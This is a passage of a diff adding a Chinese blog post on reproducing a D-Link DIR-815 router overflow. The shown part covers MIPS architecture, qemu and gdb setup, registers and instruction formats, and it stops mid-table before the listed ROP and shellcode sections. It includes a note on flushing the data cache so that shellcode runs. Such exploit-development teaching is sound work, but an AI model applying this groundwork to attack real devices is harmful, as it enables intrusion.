@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>DIR815 溢出漏洞复现 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="MIPS 架构知识
+基础概念
+
+
+MIPS 固定 4 字节指令长度
+
+
+栈是从内存的高地址向低地址方向增长的
+
+
+叶子函数：函数内部没有再调用其他函数
+
+
+非叶子函数：函数内部调用其他函数的函数
+
+
+流水线效应：在分析 MIPS 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 nop （），这是因为 MIPS 采用了高度的流水线，其中最重要的是跳转指令导致的分支延迟效应。在分支跳转语句后面那条语句叫做分支延迟槽，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应（几条指令被同时执行，只是处于不同的阶段， MIPS 不像其他架构那样存在流水线阻塞），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 nop 指令或者其他有用的指令。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/iot/dir815/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/iot/dir815/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      DIR815 溢出漏洞复现
+    </h1>
+    <div class="post-meta"><span title='2025-11-30 23:30:38 +0000 UTC'>2025年11月30日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#mips-%e6%9e%b6%e6%9e%84%e7%9f%a5%e8%af%86" aria-label="MIPS 架构知识">MIPS 架构知识</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%9f%ba%e7%a1%80%e6%a6%82%e5%bf%b5" aria-label="基础概念">基础概念</a></li>
+                    <li>
+                        <a href="#%e8%b0%83%e8%af%95" aria-label="调试">调试</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#mips-%e6%b1%87%e7%bc%96%e5%9f%ba%e7%a1%80" aria-label="MIPS 汇编基础">MIPS 汇编基础</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%af%84%e5%ad%98%e5%99%a8" aria-label="寄存器">寄存器</a></li>
+                    <li>
+                        <a href="#%e6%8c%87%e4%bb%a4%e6%a0%bc%e5%bc%8f" aria-label="指令格式">指令格式</a></li>
+                    <li>
+                        <a href="#%e5%af%bb%e5%9d%80%e6%96%b9%e5%bc%8f" aria-label="寻址方式">寻址方式</a></li>
+                    <li>
+                        <a href="#%e5%b8%b8%e7%94%a8%e6%8c%87%e4%bb%a4" aria-label="常用指令">常用指令</a></li>
+                    <li>
+                        <a href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a" aria-label="函数调用约定">函数调用约定</a></li>
+                    <li>
+                        <a href="#%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" aria-label="系统调用">系统调用</a></li>
+                    <li>
+                        <a href="#%e6%b1%87%e7%bc%96-lab" aria-label="汇编 Lab">汇编 Lab</a><ul>
+                            
+                    <li>
+                        <a href="#hello-world" aria-label="Hello World">Hello World</a></li>
+                    <li>
+                        <a href="#shellcode" aria-label="shellcode">shellcode</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af" aria-label="漏洞信息">漏洞信息</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%9b%ba%e4%bb%b6%e5%88%86%e6%9e%90" aria-label="固件分析">固件分析</a></li>
+                    <li>
+                        <a href="#%e6%9e%84%e9%80%a0rop%e9%93%be" aria-label="构造ROP链">构造ROP链</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0%e4%b8%8e%e9%9d%9e%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0" aria-label="叶子函数与非叶子函数">叶子函数与非叶子函数</a></li>
+                    <li>
+                        <a href="#%e6%b5%81%e6%b0%b4%e7%ba%bf%e6%8c%87%e4%bb%a4%e9%9b%86%e7%9b%b8%e5%85%b3%e7%89%b9%e6%80%a7" aria-label="流水线指令集相关特性">流水线指令集相关特性</a></li>
+                    <li>
+                        <a href="#%e8%b7%b3%e8%bd%ac%e5%88%b0%e6%9f%90%e4%b8%aa%e5%87%bd%e6%95%b0%e7%9a%84rop%e9%93%be%e6%9e%84%e9%80%a0%e6%8a%80%e5%b7%a7" aria-label="跳转到某个函数的ROP链构造技巧">跳转到某个函数的ROP链构造技巧</a></li>
+                    <li>
+                        <a href="#%e8%b7%b3%e8%bd%ac%e5%88%b0shellcode%e7%9a%84rop%e9%93%be%e6%9e%84%e9%80%a0%e6%8a%80%e5%b7%a7" aria-label="跳转到shellcode的ROP链构造技巧">跳转到shellcode的ROP链构造技巧</a></li>
+                    <li>
+                        <a href="#%e6%9e%84%e9%80%a0systemcmd%e7%9a%84%e5%b8%b8%e7%94%a8gadget" aria-label="构造system(cmd)的常用gadget">构造system(cmd)的常用gadget</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#qemu%e5%a4%8d%e7%8e%b0" aria-label="qemu复现">qemu复现</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%87%86%e5%a4%87%e5%b7%a5%e4%bd%9c" aria-label="准备工作">准备工作</a></li>
+                    <li>
+                        <a href="#%e7%ba%afrop%e9%93%be" aria-label="纯ROP链">纯ROP链</a></li>
+                    <li>
+                        <a href="#rop--shellcode" aria-label="ROP &#43; shellcode">ROP + shellcode</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="mips-架构知识">MIPS 架构知识<a hidden class="anchor" aria-hidden="true" href="#mips-架构知识">#</a></h2>
+<h3 id="基础概念">基础概念<a hidden class="anchor" aria-hidden="true" href="#基础概念">#</a></h3>
+<ul>
+<li>
+<p>MIPS 固定 <code>4</code> 字节指令长度</p>
+</li>
+<li>
+<p>栈是从内存的高地址向低地址方向增长的</p>
+</li>
+<li>
+<p>叶子函数：函数内部没有再调用其他函数</p>
+</li>
+<li>
+<p>非叶子函数：函数内部调用其他函数的函数</p>
+</li>
+<li>
+<p>流水线效应：在分析 MIPS 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （），这是因为 MIPS 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong>MIPS 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p>
+</li>
+<li>
+<p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p>
+</li>
+<li>
+<p>只有特定的指令（如 <code>lw</code> 和 <code>sw</code>）可以访问内存，所有其他操作都在寄存器之间完成。这种设计简化了指令和流水线操作。</p>
+</li>
+</ul>
+<h3 id="调试">调试<a hidden class="anchor" aria-hidden="true" href="#调试">#</a></h3>
+<p>安装 MIPS 架构交叉编译工具。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install gcc-mips-linux-gnu          <span class="c1"># MIPS32 大端</span>
+</span></span><span class="line"><span class="cl">sudo apt install gcc-mipsel-linux-gnu        <span class="c1"># MIPS32 小端</span>
+</span></span><span class="line"><span class="cl">sudo apt install gcc-mips64-linux-gnuabi64   <span class="c1"># MIPS64 大端</span>
+</span></span><span class="line"><span class="cl">sudo apt install gcc-mips64el-linux-gnuabi64 <span class="c1"># MIPS64 小端</span>
+</span></span><span class="line"><span class="cl">mips-linux-gnu-gcc ./demo.c -o demo
+</span></span></code></pre></div><ul>
+<li>安装动态链接库</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install libc6-mips-cross
+</span></span><span class="line"><span class="cl">sudo apt install libc6-mipsel-cross
+</span></span></code></pre></div><ul>
+<li>安装 qemu</li>
+</ul>
+<p>我们通过 qemu 来模拟运行</p>
+<pre tabindex="0"><code>sudo apt update
+sudo apt-get install qemu qemu-system-mips qemu-user qemu-user-static
+</code></pre><ul>
+<li>远行流程</li>
+</ul>
+<p>根据可执行文件架构，选择对应的 qemu 来运行。</p>
+<p>例如 MIPS 32位小端序架构，我们可以选择<code>qemu-mipsel</code>来运行。</p>
+<p>这里还要区分链接方式，如果动态链接则需要指定动态链接库。</p>
+<p><strong>静态链接：</strong></p>
+<pre tabindex="0"><code>qemu-mipsel-static ./demo
+</code></pre><p><strong>动态链接：</strong></p>
+<pre tabindex="0"><code>qemu-mipsel -L /usr/mipsel-linux-gnu ./demo
+</code></pre><ul>
+<li>调试流程</li>
+</ul>
+<p>安装<code>gdb-multiarch</code>来调试异架构程序</p>
+<pre tabindex="0"><code>sudo apt install  gdb-multiarch
+</code></pre><p>首先我们通过 qemu 以调试模式运行程序，<code>-g</code>参数表示设置为调试模式，<code>1234</code>表示程序映射的端口。</p>
+<pre tabindex="0"><code>qemu-mipsel-static -g 1234 ./demo
+</code></pre><p>然后运行<code>gdb-multiarch</code>，并根据架构和端序设置参数。</p>
+<pre tabindex="0"><code>gdb-multiarch
+set architecture mips
+set endian little
+</code></pre><p>然后连接映射程序的端口</p>
+<pre tabindex="0"><code>target remote localhost:1234
+</code></pre><p>运行动态链接程序，需要通过<code>-L</code>参数指定动态链接库位置。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn
+</span></span></code></pre></div><p>运行静态链接程序，直接使用 qemu 运行即可。</p>
+<pre tabindex="0"><code>qemu-mipsel ./pwn
+</code></pre><p>gcc 交叉编译 mips 程序。</p>
+<pre tabindex="0"><code>mipsel-linux-gnu-gcc vuln.c -o vuln
+</code></pre><ul>
+<li>调试</li>
+</ul>
+<p>通过 qemu 运行程序映射到端口，然后通过 gdb 连接调试。</p>
+<p>qemu 将一个 mips 程序运行并映射到 1234 端口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-mipsel -L /usr/mipsel-linux-gnu/ -g <span class="m">1234</span> ./pwn
+</span></span><span class="line"><span class="cl">gdb-multiarch ./pwn -q
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> architecture mips
+</span></span><span class="line"><span class="cl">target remote localhost:1234
+</span></span></code></pre></div><pre tabindex="0"><code>show architecture
+</code></pre><h2 id="mips-汇编基础">MIPS 汇编基础<a hidden class="anchor" aria-hidden="true" href="#mips-汇编基础">#</a></h2>
+<h3 id="寄存器">寄存器<a hidden class="anchor" aria-hidden="true" href="#寄存器">#</a></h3>
+<p>MIPS 有 32 个通用寄存器，其中每个寄存器都是 32 位，用于存储操作数、中间结果、返回地址等。</p>
+<table>
+  <thead>
+      <tr>
+          <th>寄存器编号</th>
+          <th>寄存器名称</th>
+          <th>寄存器描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td><code>zero</code></td>
+          <td>永远为零</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td><code>$at</code></td>
+          <td>保留寄存器</td>
+      </tr>
+      <tr>
+          <td>2~3</td>
+          <td><code>$v0~$v1</code></td>
+          <td>函数返回值</td>
+      </tr>
+      <tr>
+          <td>4~7</td>
+          <td><code>a0-a3</code></td>
+          <td>函数参数寄存器，不够用堆栈处理</td>
+      </tr>
+      <tr>
+          <td>8~15</td>
+          <td><code>t0-t7</code></td>
+          <td>临时寄存器</td>
+      </tr>
+      <tr>
+          <td>16~23</td>
+          <td><code>$s0~$s7</code></td>
+          <td>保存寄存器，用于保存函数调用中的参数和返回值</td>
+      </tr>
+      <tr>
+          <td>24~25</td>
+          <td><code>$t8~$t9</code></td>
+          <td>临时寄存器</td>
+      </tr>
+      <tr>
+          <td>26~27</td>
+          <td><code>$k0~$k1</code></td>
+          <td>保留寄存器</td>
+      </tr>
+      <tr>
+          <td>28</td>
+          <td><code>$gp</code></td>
+          <td>全局指针</td>
+      </tr>
+      <tr>
+          <td>29</td>
+          <td><code>$sp</code></td>
+          <td>堆栈指针</td>
+      </tr>
+      <tr>
+          <td>30</td>
+          <td><code>$fp</code></td>
+          <td>保存栈指针</td>
+      </tr>
+      <tr>
+          <td>31</td>
+          <td><code>$ra</code></td>
+          <td>返回地址</td>
+      </tr>
+  </tbody>
+</table>
+<p>MIPS 架构中还定义了 3 个特殊的寄存器，分别是<code>PC</code>（程序计数器）、<code>HI</code>（乘除结果高位寄存器）、<code>LO</code>（乘除结果低位寄存器）。</p>
+<h3 id="指令格式">指令格式<a hidden class="anchor" aria-hidden="true" href="#指令格式">#</a></h3>
+<p>MIPS 的指令集采用 3 种主要格式：</p>
+<ol>
+<li>
+<p>R 型指令（Register）</p>
+<ul>
+<li>这种指令格式用于寄存器之间的操作。</li>
+<li>格式：<code>opcode | rs | rt | rd | shamt | funct</code>
+<ul>
+<li>opcode：操作码，指令该指令的操作类型。</li>
+<li>rs,rt：源寄存器。</li>
+<li>rd：目标寄存器。</li>
+<li>shamt：移位操作的位数。</li>
+<li>funct：指定具体操作的附加操作码。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I 型指令（Immediate）</p>
+<ul>
+<li>这种指令用于处理立即数（常量）和寄存器的操作。</li>
+<li>格式：<code>opcode | rs | rt | immediate</code>
+<ul>
+<li><code>opcode</code>：操作码，指定该指令的操作类型。</li>
+<li><code>rs</code>：源寄存器。</li>
+<li><code>rt</code>：目标寄存器。</li>
+<li><code>immediate</code>：立即数，用于与寄存器中的值进行运算。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>J 型指令（Jump）</p>
+<ul>
+<li>这种指令用于跳转到其他地址。</li>
+<li>格式：<code>opcode | address</code>
+<ul>
+<li><code>opcode</code>：操作码。</li>
+<li><code>address</code>：跳转目标地址。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="寻址方式">寻址方式<a hidden class="anchor" aria-hidden="true" href="#寻址方式">#</a></h3>
+<ol start="4">
+<li>立即数寻址：操作数是位于指令自身中的常数。</li>
+</ol>
+<p>将 <code>$t1</code> 中的值加上常数 10，并存储在 <code>$t0</code> 中</p>
+<pre tabindex="0"><code>addi $t0, $t1, 10
+</code></pre><ol start="5">
+<li>寄存器寻址：操作数是寄存器。</li>
+</ol>
+<p>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中</p>
+<pre tabindex="0"><code>add $t0, $t1, $t2
+</code></pre><ol start="6">
+<li>基址寻址或偏移寻址：操作数在内存中，其地址是指令中基址寄存器和常数的和，如lw与sw指令。</li>
+</ol>
+<p>从 <code>$t1</code> 中的基址加上偏移量 4 的内存地址处加载数据到 <code>$t0</code> 中，然后将 <code>$t0</code> 的值存储到 <code>$sp</code> 基址减去 8 的内存地址中。</p>
+<pre tabindex="0"><code>lw $t0, 4($t1)
+sw $t0, -8($sp)
+</code></pre><ol start="7">
+<li><code>PC</code>相对寻址：地址是<code>PC</code>和指令中常数的和。</li>
+</ol>
+<p>如果 <code>$t0</code> 和 <code>$t1</code> 相等，则跳转到偏移地址处执行</p>
+<pre tabindex="0"><code>beq $t0, $t1, offset
+</code></pre><ol start="8">
+<li>伪直接寻址：跳转地址由指令中26字段和PC高位相连而成。</li>
+</ol>
+<p>跳转到目标地址，由 <code>PC</code> 高位与指令中的 26 位目标字段拼接而成</p>
+<pre tabindex="0"><code>j target
+</code></pre><h3 id="常用指令">常用指令<a hidden class="anchor" aria-hidden="true" href="#常用指令">#</a></h3>
+<table>
+  <thead>
+      <tr>
+          <th>类型</th>
+          <th>指令</th>
+          <th>功能描述</th>
+          <th>示例</th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>add</code></td>
+          <td>加法，$rd = $rs + $rt</td>
+          <td><code>add $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>sub</code></td>
+          <td>减法，$rd = $rs - $rt</td>
+          <td><code>sub $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>and</code></td>
+          <td>按位与，$rd = $rs &amp; $rt</td>
+          <td><code>and $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>or</code></td>
+          <td>按位或，$rd = $rs</td>
+          <td>$rt</td>
+          <td><code>or $t0, $t1, $t2</code></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>xor</code></td>
+          <td>按位异或，$rd = $rs ^ $rt</td>
+          <td><code>xor $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>nor</code></td>
+          <td>按位取反或，$rd = ~($rs</td>
+          <td>$rt)</td>
+          <td><code>nor $t0, $t1, $t2</code></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>sll</code></td>
+          <td>逻辑左移，$rd = $rt &laquo; sa</td>
+          <td><code>sll $t0, $t1, 2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>srl</code></td>
+          <td>逻辑右移，$rd = $rt &raquo; sa</td>
+          <td><code>srl $t0, $t1, 2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>sra</code></td>
+          <td>算术右移，$rd = $rt &raquo; sa</td>
+          <td><code>sra $t0, $t1, 2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>slt</code></td>
+          <td>小于，$rd = ($rs &lt; $rt) ? 1 : 0</td>
+          <td><code>slt $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>R 型</strong></td>
+          <td><code>sltu</code></td>
+          <td>无符号小于，$rd = ($rs &lt; $rt unsigned) ? 1 : 0</td>
+          <td><code>sltu $t0, $t1, $t2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>addi</code></td>
+          <td>加法立即数，$rt = $rs + imm</td>
+          <td><code>addi $t0, $t1, 10</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>addiu</code></td>
+          <td>无符号加法立即数，$rt = $rs + imm</td>
+          <td><code>addiu $t0, $t1, 10</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>andi</code></td>
+          <td>按位与立即数，$rt = $rs &amp; imm</td>
+          <td><code>andi $t0, $t1, 0xFF</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>ori</code></td>
+          <td>按位或立即数，$rt = $rs</td>
+          <td>imm</td>
+          <td><code>ori $t0, $t1, 0xFF</code></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>xori</code></td>
+          <td>按位异或立即数，$rt = $rs ^ imm</td>
+          <td><code>xori $t0, $t1, 0xFF</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>slti</code></td>
+          <td>小于立即数，$rt = ($rs &lt; imm) ? 1 : 0</td>
+          <td><code>slti $t0, $t1, 10</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>sltiu</code></td>
+          <td>无符号小于立即数，$rt = ($rs &lt; imm unsigned) ? 1 : 0</td>
+          <td><code>sltiu $t0, $t1, 10</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lui</code></td>
+          <td>加载上半字，$rt = imm &laquo; 16</td>
+          <td><code>lui $t0, 0x1000</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lw</code></td>
+          <td>从内存加载字（32位）到寄存器 $rt</td>
+          <td><code>lw $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
